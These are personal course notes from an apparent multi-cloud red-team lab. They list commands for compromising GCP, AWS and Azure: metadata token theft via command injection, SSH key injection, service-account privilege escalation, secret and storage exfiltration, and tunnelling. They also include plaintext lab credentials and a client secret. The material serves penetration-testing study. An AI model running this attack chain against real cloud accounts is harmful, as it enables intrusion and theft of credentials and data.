# Course notes
A cloud could also have ...
- One account which can manage multiple accounts (ex. AWS orginisations)
- Cross account access (ex. Azure guest users)
- In GCP by default role attached to compute instance, in AWS/Azure its not enabled by default

### Apps URLs
AWS  -  orgname.awsapps.com/start
Microsoft - https://myapps.microsoft.com/

### Important URLs
MS admin portal - https://portal.microsoft.com/Adminportal/Home
GCP identity - admin.google.com
GCP user - myaccount.google.com

SAML, OpenIDConnect, O-Auth

Policies
- Inline policy
- Managed Policy - Managed policies, Customer Managed policies

Pentesting methodology
- MITRE ATT&CK Cloud matrix
- Cyberwarefarelabs - redteam attack flow

#### Resource hirarchy
- AWS - https://cdn.ttgtmedia.com/rms/onlineimages/aws_resource_hierarchy-f_mobile.png
- Azure - https://learn.microsoft.com/en-us/azure/cloud-adoption-framework/ready/azure-setup-guide/media/organize-resources/scope-levels.png
- GCP - https://cloud.google.com/static/resource-manager/img/cloud-hierarchy.svg 

#### Tools
- ```cloud_enum.py``` - bruteforce names against multi-cloud DNS bruteforce for services
- PACU for AWS

### Metadata
- ```curl http://169.254.169.254``` - All cloud providers have same IP to check if it is a cloud instance
- ```curl http://169.254.169.254/metadata```
 
# Commands
Login to gcp cli
```gcloud auth activate-service-account --key-file auth.json```

gcloud login with access-token ```gcloud projects list --access-token-file accesstoken.txt```

# Lab commands

gcloud auth activate-service-account --key-file ./sonic-airfoil-339910-8c4c6de6bf0d.json 

gcloud projects get-iam-policy sonic-airfoil-339910 --flatten="bindings[].members" --filter="bindings.members=serviceaccount:ssa-service-account@sonic-airfoil-339910.iam.gserviceaccount.com" --format="value(bindings.role)" - Output we get role name, use that for next command

gcloud iam roles describe 684bk057 --project sonic-airfoil-339910

gcloud container clusters list --format json

gcloud container clusters list

gcloud compute forwarding-rules list - we get an IP

URLs
- http://34.132.232.167/?cmd=curl%20http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email%20-H%20%22Metadata-Flavor:Google%22
- http://34.132.232.167/?cmd=curl%20http://169.254.169.254/computeMetadata/v1/instance/service-accounts/gke-service-account@sonic-airfoil-339910.iam.gserviceaccount.com/token%20-H%20%22Metadata-Flavor:Google%22
- https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=[TOKEN]

gcloud compute instances list

gcloud compute instances get-iam-policy tesing-instance --zone us-central1-b --flatten="bindings[].members" --filter="bindings.members=serviceaccount:gke-service-account@sonic-airfoil-339910.iam.gserviceaccount.com" --format="value(bindings.role)"

gcloud iam roles describe ew606s6o --project sonic-airfoil-339910

ssh-keygen , gcp.pub created, add gcp:... to the file which because we want gcp is username

gcloud compute instances add-metadata tesing-instance --metadata-from-file ssh-keys=gcp.pub --zone us-central1-b --access-token-file sess.txt

gcloud compute instances describe tesing-instance - get the ip of vm

[chmod 600 ./gcp]

ssh -i ./gcp gcp@104.154.17.222 
- get the name of service account attached to that VM - gcloud auth list
- gcloud auth print-access-token

gcloud projects get-iam-policy sonic-airfoil-339910 --flatten="bindings[].members" --filter="bindings.members=serviceaccount:dsa-service-account@sonic-airfoil-339910.iam.gserviceaccount.com" --format="value(bindings.role)"

gcloud iam service-accounts list

(using auth token of SSH VM's account) - gcloud functions deploy privesc-fun --timeout 539 --trigger-http --allow-unauthenticated --source function-source --runtime python37 --entry-point hello_world --service-account msa-service-account@sonic-airfoil-339910.iam.gserviceaccount.com --access-token-file ./testing-instance.txt

(Not working) - gcloud functions deploy privesc-fun --timeout 539 --trigger-http --allow-unauthenticated --source function-source --runtime python37 --entry-point hello_world --service-account msa-service-account@sonic-airfoil-339910.iam.gserviceaccount.com --access-token-file ./vm-token.txt

- https://us-central1-sonic-airfoil-339910.cloudfunctions.net/privesc-fun

gcloud iam service-accounts get-iam-policy cpsa-service-account@sonic-airfoil-339910.iam.gserviceaccount.com

gcloud iam roles describe hivb3dzc --project sonic-airfoil-339910

gcloud iam service-accounts keys create cpsa-key.json --iam-account=cpsa-service-account@sonic-airfoil-339910.iam.gserviceaccount.com --access-token-file function_sess.txt 

gcloud auth activate-service-account --key-file cpsa-key.json

gcloud projects list

gcloud projects get-iam-policy project-staging-344908 --flatten="bindings[].members" --format="table(bindings.role)" --filter="bindings.members:cpsa-service-account@sonic-airfoil-339910"

gcloud config set project project-staging-344908

gcloud compute instances list

gcloud compute instances describe staging-instance

gcloud compute firewall-rules list

gcloud compute firewall-rules describe fw-allow-private-staging-vpc

ssh-keygen - vm-oslogin - do this in Mac

gcloud compute os-login ssh-keys add --key-file=vm-oslogin.pub - we get login profile name use it as username - do this in mac

Copy the vm-oslogin file(not the .pub file) to testing-instance and do chmod 0600 vm-oslogin

ssh -i vm-oslogin sa_106304274774497555045@34.170.123.186 - from inside testing-instance

(now we are inside staging instance) get access token of SPN of that staging - gcloud auth print-access-token

gcloud storage ls --access-token-file vm-staging-token.txt
gcloud storage ls gs://staging-storage-metatech/ --access-token-file vm-staging-token.txt

Download files = gcloud storage cp gs://staging-storage-metatech/roadmaps . --access-token-file staging.txt

gcloud compute instances describe staging-instance - Now copy the private key file from output the .ppk file

 --- AWS ---
puttygen aws_ec2.ppk -O private-openssh -o ssh-jump-host.pem

ssh -i ssh-jump-host.pem ec2-user@18.118.189.176

(after login)

aws sts get-caller-identity

aws iam list-attached-role-policies --role-name jumphost-iam-access-role

aws iam list-role-policies --role-name jumphost-iam-access-role

aws iam get-role-policy --policy-name iam_policy --role-name jumphost-iam-access-role

metadata - curl http://169.254.169.254/latest/user-data/

nc -nv 10.20.1.220 80 - from inside ec2 we can see git lab is open

sudo ssh -L 127.0.0.1:80:10.20.1.220:80 -i ./ssh-jump-host.pem ec2-user@18.118.189.176 - port forward to access gitlab

gns, Password@123 - gitlab password

sudo ssh -L 127.0.0.1:8080:10.20.1.252:8080 -i ssh-jump-host.pem ec2-user@18.118.189.176 - port forward for jenkens

ssh -i aws_prod_ssh.pem ec2-user@10.20.2.20

metadata
- curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
- curl http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-data-access-role

export AWS_ACCESS_KEY_ID='your_access_key_id_here'
export AWS_SECRET_ACCESS_KEY='your_secret_access_key_here'
export AWS_SESSION_TOKEN='your_session_token_here'

aws secretsmanager list-secrets --profile prod-srv --region us-east-2

aws secretsmanager get-secret-value --secret-id database-admin-credential --profile prod-srv --region us-east-2

aws s3api list-buckets --region us-east-2

aws s3api list-objects --bucket meta-tech-bucket20230929140406617200000001 --region us-east-2

aws s3api get-object --bucket meta-tech-bucket20230929140406617200000001 --key Modules/AWS/sensitive-private.txt aws-private.txt

[ content of aws-private.txt 
Production User's Credentials:
Username : kevin.ade
Password: DFerj@344fdj
Role : Devops Admin

Username : lim.las
Password: Hyd5444&3j
Role : Cloud Admin

Username : srv_acc
Password: 88D4hdhdh%34
Role : On-Premise Admin
]

aws rds describe-db-instances --region us-east-2

aws ec2 describe-security-groups --group-ids sg-0ee9fbf3806a20723 --region us-east-2

ssh -L 127.0.0.1:3306:prod-database.cdemh5kczfej.us-east-2.rds.amazonaws.com:3306 -i aws-prod-ssh-key.pem ec2-user@10.20.2.20

[db commands mysql -h 127.0.0.1 -u database_admin -p
.
.
.]

-- AZURE --
https://login.windows.net/meta-tech.cloud/.well-known/openid-configuration

az login --service-principal --username bf3a573f-bedc-45e5-8a68-2fb9fdbbbf58 --password tDZ8Q~XXd3zd9Z1mtjsgHG-4gGQq6i6A~idr2bdR --tenant 68b40a4c-50f1-48f3-b7cb-916dd82418a7

az ad sp list --filter "AppId eq 'bf3a573f-bedc-45e5-8a68-2fb9fdbbbf58'"

az account get-access-token --resource https://graph.microsoft.com

Connect-MgGraph --AccessToken "MSGraphAccessToken"
[ use ps to login to graph

$clientId = "bf3a573f-bedc-45e5-8a68-2fb9fdbbbf58"
$clientSecret = "tDZ8Q~XXd3zd9Z1mtjsgHG-4gGQq6i6A~idr2bdR"
$tenantId = "68b40a4c-50f1-48f3-b7cb-916dd82418a7"

$clientSecretSecure = ConvertTo-SecureString -String $clientSecret -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $clientId, $clientSecretSecure
Connect-MgGraph -Credential $credential -TenantId $tenantId
]

Get-MgGroup

[ get barer token
$context = Get-MgContext
$token = $context.Token.AccessToken
]
curl -X GET -H "Authorization: Bearer $Token" https://graph.microsoft.com/beta/groups/21ea2faa-d0e4-432b-ba45-c61b3a2bf4f0/owners

curl -X GET -H "Authorization: Bearer $Token" https://graph.microsoft.com/beta/groups/21ea2faa-d0e4-432b-ba45-c61b3a2bf4f0/members

Get-MgServicePrincipal -filter "AppId eq 'bf3a573f-bedc-45e5-8a68-2fb9fdbbbf58'"

New-MgGroupMember -GroupId '21ea2faa-d0e4-432b-ba45-c61b3a2bf4f0' -DirectoryObjectId 'd36c9074-71a3-4dcf-928f-b445eeb6f6ca'

curl -X GET -H "Authorization: Bearer $Token" https://graph.microsoft.com/beta/groups/21ea2faa-d0e4-432b-ba45-c61b3a2bf4f0/members

az account list

az role assignment list --subscription 484f280d-a210-4272-b85d-cdd1a66572ed --all

az role definition list --name "view-only-role"

az keyvault list

az keyvault secret list --vault-name meta-tech-dev-vault

az keyvault secret show --id https://meta-tech-dev-vault.vault.azure.net/secrets/Dev-VM-Key

az vm list

az vm list-ip-addresses -g Engineering-RG -n eng-dev-vm

ssh -i Dev-VM-Key devuser@40.88.44.0

az login --identity

az role assignment list --subscription 484f280d-a210-4272-b85d-cdd1a66572ed --assignee b9134241-ac54-4983-8298-2d2296bbc1b0 --all

az role assignment list --subscription 2ee836d0-7c16-4037-a974-3a19691573d4 --assignee b9134241-ac54-4983-8298-2d2296bbc1b0 --all

az role definition list --name vm-runcommand

az vm list --subscription 2ee836d0-7c16-4037-a974-3a19691573d4

az vm run-command invoke -g IT-RG -n it-gts-vm --command-id RunShellScript --scripts "hostname"

az vm run-command invoke -g IT-RG -n it-gts-vm --command-id RunShellScript --scripts 'curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"'

az role assignment list --subscription 2ee836d0-7c16-4037-a974-3a19691573d4 --assignee 9eda75b7-d285-4772-89ee-1df89717317 --all

az automation account list --subscription 2ee836d0-7c16-4037-a974-3a19691573d4

Connect-AzAccount -AccountId $SubscriptionID -AccessToken $AccessToken

Get-AzAutomationRunbook -ResourceGroupName IT-RG -AutomationAccountName GTS-Automation

Export-AzAutomationRunbook -ResourceGroupName "IT-RG" -AutomationAccountName "GTS-Automation" -Name "Test-Automation" -Slot "Published" -OutputFolder "." -Verbose

Export-AzAutomationRunbook -ResourceGroupName "IT-RG" -AutomationAccountName "GTS-Automation" -Name "Prod-Automation" -Slot "Published" -OutputFolder "." -Verbose

az vm list --subscription 2ee836d0-7c16-4037-a974-3a19691573d4 -o table

az network public-ip list -g IT-RG --subscription 2ee836d0-7c16-4037-a974-3a19691573d4 -o table

az network nsg list --subscription 2ee836d0-7c16-4037-a974-3a19691573d4

ssh -L 3389:10.30.2.132:3389 -i Dev-VM-Key devuser@40.88.44.0

rdp : azureuser@MetaTech1234:127.0.0.1:3389

Get-AzStorageAccount

$storageAccount = Get-AzStorageAccount -Name "metatechdevsa" -ResourceGroupName "IT-RG"
$storageAccount.Context

Get-AzStorageContainer -Context $storageAccount.Context | ConvertTo-Json

Get-AzStorageBlob -Container metatech-dev-container -Context $storageAccount.Context

Get-AzStorageBlobContent -Container metatech-dev-container -Context $storageAccount.Context -Blob metatech-critical-data.txt
